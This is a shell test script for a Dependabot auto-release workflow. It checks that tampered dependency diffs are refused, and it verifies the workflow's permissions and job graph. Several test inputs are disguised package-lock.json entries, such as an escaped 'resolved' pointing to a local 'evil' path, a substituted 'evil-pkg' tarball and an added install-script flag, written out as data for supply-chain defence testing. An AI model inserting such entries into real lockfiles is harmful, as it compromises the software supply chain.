ecosystem_case skip "gomod: a retract line is not a requirement" gomod go.mod $'@@ -90 +90,2 @@\n )\n+retract v1.0.0' "retract"
ecosystem_case skip "gomod: a go.sum hash that is no h1 hash is not a bump" gomod go.sum \
	$'@@ -152 +152 @@\n-golang.org/x/crypto v0.57.0 h1:3ZVCjf8Ggz7zneR/EHRVx68Ctf+2pmIMP2UFhh9cC6M=\n+golang.org/x/crypto v0.58.0 h1:short=' "short"

# Dockerfile FROM: a reference on both sides, and a digest is never dropped.
ecosystem_case skip "docker: a dropped digest is not a bump" docker "$DF" \
	$'@@ -1 +1 @@\n-FROM golang:1.22@sha256:'"$(printf 'a%.0s' {1..64})"$' AS b\n+FROM golang:1.23 AS b' "golang:1.23"
ecosystem_case skip "docker: a dropped tag and digest (floating on latest) is not a bump" docker "$DF" \
	$'@@ -1 +1 @@\n-FROM golang:1.22 AS b\n+FROM golang AS b' "golang AS b"
ecosystem_case skip "docker: a stage reference turned into an image is not a bump" docker "$DF" \
	$'@@ -9 +9 @@\n-FROM build AS final\n+FROM build:1 AS final' "build:1"

# package-lock.json: an allowlist, with each resolved tied to its own entry.
NPM_ENTRY=$'@@ -100,4 +100,4 @@\n     "node_modules/lodash": {\n-      "version": "4.17.20",\n-      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",\n'
ecosystem_case skip "npm: a resolved spelled with a JSON escape is not a bump" npm web/package-lock.json \
	"$NPM_ENTRY"$'+      "version": "4.17.21",\n+      "\\u0072esolved": "file:../../evil",' "u0072"
ecosystem_case skip "npm: a link spelled with a JSON escape is not a bump" npm web/package-lock.json \
	"$NPM_ENTRY"$'+      "version": "4.17.21",\n+      "\\u006cink": true,' "u006c"
ecosystem_case skip "npm: another registry package under an entry is not a bump" npm web/package-lock.json \
	"$NPM_ENTRY"$'+      "version": "6.6.6",\n+      "resolved": "https://registry.npmjs.org/evil-pkg/-/evil-pkg-6.6.6.tgz",' "evil-pkg"
ecosystem_case skip "npm: a resolved for another version than its entry's is not a bump" npm web/package-lock.json \
	"$NPM_ENTRY"$'+      "version": "4.17.21",\n+      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",' "lodash-4.17.20.tgz"
ecosystem_case skip "npm: a resolved whose entry is not in the patch is not a bump" npm web/package-lock.json \
	$'@@ -101,2 +101,2 @@\n       "version": "4.17.21",\n-      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",\n+      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",' "lodash-4.17.21.tgz"
ecosystem_case skip "npm: an alias (a name in an entry) is not a bump" npm web/package-lock.json \
	"$NPM_ENTRY"$'+      "name": "evil-pkg",\n+      "version": "4.17.21",' "evil-pkg"
ecosystem_case skip "npm: any backslash in an added line is refused, even where the key allows a free string" npm web/package-lock.json \
	"$NPM_ENTRY"$'+      "version": "4.17.21",\n+      "deprecated": "use \\u0022other",' "deprecated"
ecosystem_case skip "npm: an install script flag is not a bump" npm web/package-lock.json \
	"$NPM_ENTRY"$'+      "version": "4.17.21",\n+      "hasInstallScript": true,' "hasInstallScript"
ecosystem_case skip "npm: a dependency spec that is a git URL is not a bump" npm web/package-lock.json \
	$'@@ -110 +110 @@\n-        "lodash": "^4.17.20"\n+        "lodash": "git+https://example.com/x.git"' "example.com"
ecosystem_case skip "npm: a version that is a path is not a bump" npm web/package-lock.json \
	"$NPM_ENTRY"$'+      "version": "file:../evil",' "file:"
ecosystem_case release "npm: a scoped package nested under another resolves from its own name" npm web/package-lock.json \
	$'@@ -200,3 +200,3 @@\n     "node_modules/a/node_modules/@scope/b": {\n-      "version": "1.0.0",\n-      "resolved": "https://registry.npmjs.org/@scope/b/-/b-1.0.0.tgz",\n+      "version": "1.0.1",\n+      "resolved": "https://registry.npmjs.org/@scope/b/-/b-1.0.1.tgz",\n+      "integrity": "sha512-AAAA+/==",'
ecosystem_case release "npm: a new entry with engines, dependencies and license ships" npm web/package-lock.json \
	$'@@ -300 +300,12 @@\n     },\n+    "node_modules/new-dep": {\n+      "version": "2.0.0",\n+      "resolved": "https://registry.npmjs.org/new-dep/-/new-dep-2.0.0.tgz",\n+      "integrity": "sha512-BBBB",\n+      "dev": true,\n+      "license": "MIT",\n+      "dependencies": {\n+        "@vue/shared": "3.5.0"\n+      },\n+      "engines": {\n+        "node": "^20.19.0 || >=22.12.0"\n+      }\n+    },'

echo "# mark"

mark() {
	run_step mark GH_TOKEN=x REPO="$REPO_NAME" SHA="$(sha_of 5)" DEFAULT_BRANCH=main VERSION=1.10.1 TAG=v1.10.1 RECONCILE="${RECONCILE:-}"
}
fixture
jq -n --arg sha "$(sha_of 5)" '{object: {sha: $sha}}' >"$GH_STUB_DIR/head"
mark
if [ "$STATUS" -eq 0 ] && [ "$(out release)" = true ] && [ "$(out version)" = 1.10.1 ] && [ "$(out tag)" = v1.10.1 ]; then
	ok "the default branch still at the pushed commit marks the release"
else
	not_ok "the default branch still at the pushed commit marks the release" "$LOG$OUTPUT"
fi

fixture
jq -n --arg sha "$(sha_of 6)" '{object: {sha: $sha}}' >"$GH_STUB_DIR/head"
mark
if [ "$STATUS" -eq 0 ] && [ -z "$OUTPUT" ] && grep -q "moved on" <<<"$LOG"; then
	ok "a default branch that moved on leaves the release to the newer run"
else
	not_ok "a default branch that moved on leaves the release to the newer run" "$LOG$OUTPUT"
fi

fixture
jq -n --arg sha "$(sha_of 6)" '{object: {sha: $sha}}' >"$GH_STUB_DIR/head"
RECONCILE=true mark
if [ "$STATUS" -eq 0 ] && [ "$(out release) $(out tag)" = "true v1.10.1" ] && [ ! -s "$GH_STUB_DIR/calls" ]; then
	ok "a release being finished goes on even when the default branch moved on"
else
	not_ok "a release being finished goes on even when the default branch moved on" "$LOG$OUTPUT"
fi

fixture
echo "gh: Server Error (HTTP 502)" >"$GH_STUB_DIR/head.fail"
mark
if [ "$STATUS" -ne 0 ] && [ -z "$OUTPUT" ]; then ok "an API error reading the head fails"; else not_ok "an API error reading the head fails" "$LOG"; fi

echo "# job graph"

check() {
	if [ "$2" = "$3" ]; then ok "$1"; else not_ok "$1" "want: $3
got:  $2"; fi
}
perms() { wf ".jobs.$1.permissions | to_entries | map(.key + \":\" + .value) | join(\" \")"; }
check "authorize: read-only, pull requests and contents" "$(perms authorize)" "contents:read pull-requests:read"
check "authorize: no checkout and no repository code" "$(wf '[.jobs.authorize.steps[] | select(.uses != null)] | length')" "0"
check "authorize: the ecosystems reach the script through env" "$(wf '.jobs.authorize.steps[0].env.ECOSYSTEMS')" "\${{ inputs.ecosystems }}"
check "the ecosystems default to none: action pins only, as before" "$(wf '.on.workflow_call.inputs.ecosystems.default')" ""
check "authorize: only a push whose head merges a dependabot/ branch spends a runner" "$(wf '.jobs.authorize.if')" \
	"github.event_name == 'push' && startsWith(github.event.head_commit.message, 'Merge pull request #') && contains(github.event.head_commit.message, '/dependabot/')"
check "ci: actions and contents read only" "$(perms ci)" "actions:read contents:read"
check "ci: needs the authorization" "$(wf '.jobs.ci.needs + " " + .jobs.ci.if')" "authorize needs.authorize.outputs.authorized == 'true'"
check "ci: waits on the pushed SHA, for the push to the default branch" \
	"$(wf '.jobs.ci.steps[0].with.sha + " " + .jobs.ci.steps[0].with["accepted-events"]')" "\${{ github.sha }} push"
check "ci: the pinned require-ci-green" "$(wf '.jobs.ci.steps[0].uses')" \
	"leinardi/gh-composite-actions/require-ci-green@addc113a34e0a96ca2e08218380fdecad2fdd230"
check "ci: release=true is written after the gate, in the same job" "$(wf '.jobs.ci.steps[1].id')" "mark"
check "ci: the mark gets the authorized version" "$(wf '.jobs.ci.steps[1].env.VERSION + " " + .jobs.ci.steps[1].env.TAG')" \
	"\${{ needs.authorize.outputs.version }} \${{ needs.authorize.outputs.tag }}"
check "the release output is the ci job's mark only" "$(wf '.on.workflow_call.outputs.release.value')" "\${{ jobs.ci.outputs.release }}"
check "no job calls another workflow (the caller calls simple-tag-and-release)" "$(wf '[.jobs[] | select(has("uses"))] | length')" "0"
check "the workflow's group is its own and never cancelled" \
	"$(wf '.concurrency.group + " " + (.concurrency["cancel-in-progress"] | tostring)')" \
	"dependabot-release-\${{ github.repository }} false"
check "every job has a timeout" "$(wf '[.jobs[] | has("timeout-minutes")] | all')" "true"
check "ci: the mark knows a release being finished" "$(wf '.jobs.ci.steps[1].env.RECONCILE')" "\${{ needs.authorize.outputs.reconcile }}"
LOCAL="$ROOT/.github/workflows/local-release.yaml"
check "local-release: push runs share one group for the whole workflow, never cancelled" \
	"$(yq -r '.concurrency.group + " " + (.concurrency["cancel-in-progress"] | tostring)' "$LOCAL")" \
	"\${{ github.event_name == 'push' && format('release-flow-{0}', github.repository) || github.run_id }} false"
check "local-release: the release gets the Dependabot version on a push" "$(yq -r '.jobs.release.with.version' "$LOCAL")" \
	"\${{ github.event_name == 'workflow_dispatch' && inputs.version || needs.dependabot.outputs.version }}"

echo
echo "$PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
